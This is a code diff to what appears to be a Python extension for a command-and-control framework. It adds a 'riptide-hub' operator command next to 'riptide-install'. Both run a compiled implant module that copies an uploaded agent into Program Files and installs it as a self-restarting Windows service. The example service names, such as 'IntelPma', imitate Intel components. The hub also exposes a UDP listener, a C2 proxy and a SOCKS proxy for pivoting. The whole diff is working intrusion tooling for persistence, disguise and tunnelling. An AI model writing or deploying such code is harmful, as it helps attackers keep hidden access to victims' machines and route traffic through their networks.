@@ -31,6 +31,11 @@ def _kit_dir():
     return os.path.expanduser("~/github/maelstrom-mesh/bof")
 
 
+def riptide_hub(demonID, *param):
+    """Same BOF as riptide-install; conf must be a hub (ListenPort)."""
+    return riptide_install(demonID, *param)
+
+
 def riptide_install(demonID, *param):
     demon = Demon(demonID)
     src = param[0] if len(param) > 0 else ""
@@ -39,8 +44,9 @@ def riptide_install(demonID, *param):
     if not src:
         demon.ConsoleWrite(
             demon.CONSOLE_ERROR,
-            "riptide-install <src.exe> [peer.conf] [svc_name]\n"
-            "upload the agent + conf first, then install (BOF does not fetch)",
+            "riptide-install <src.exe> [peer.conf|hub.conf] [svc_name]\n"
+            "riptide-hub     <src.exe> [hub.conf] [svc_name]\n"
+            "same installer — hub conf has ListenPort (UDP inbound). upload first.",
         )
         return False
     obj = os.path.join(_kit_dir(), "mesh_install.x64.o")
@@ -63,10 +69,13 @@ def riptide_help(demonID, *param):
     demon.ConsoleWrite(
         demon.CONSOLE_INFO,
         "riptide-install <src.exe> [peer.conf] [svc_name]\n"
+        "riptide-hub     <src.exe> [hub.conf]  [svc_name]\n"
         "  copies to %ProgramFiles%\\Riptide\\ and CreateService delayed-auto\n"
-        "  recovery restart, NetworkService, userspace SOCKS on overlay :1080\n"
-        "  example: riptide-install C:\\Users\\Public\\riptide-agent.exe "
-        "C:\\Users\\Public\\peer.conf IntelPma\n",
+        "  hub conf = ListenPort UDP (cryptokey relay + C2 proxy + SOCKS)\n"
+        "  example spoke: riptide-install C:\\Users\\Public\\riptide-agent.exe "
+        "C:\\Users\\Public\\peer.conf IntelPma\n"
+        "  example hub:   riptide-hub C:\\Users\\Public\\riptide-agent.exe "
+        "C:\\Users\\Public\\peer.conf IntelPmaHub\n",
     )
     return True
 
@@ -88,5 +97,14 @@ RegisterCommand(
     0,
     "<src.exe> [peer.conf] [svc_name]",
     r"C:\Users\Public\riptide-agent.exe C:\Users\Public\peer.conf IntelPma",
+)
+RegisterCommand(
+    riptide_hub,
+    "",
+    "riptide-hub",
+    "Install extra hub on this host (same BOF; conf has ListenPort)",
+    0,
+    "<src.exe> [hub.conf] [svc_name]",
+    r"C:\Users\Public\riptide-agent.exe C:\Users\Public\peer.conf IntelPmaHub",
 )
 RegisterCommand(riptide_help, "riptide", "help", "Show riptide-install usage", 0, "", "")
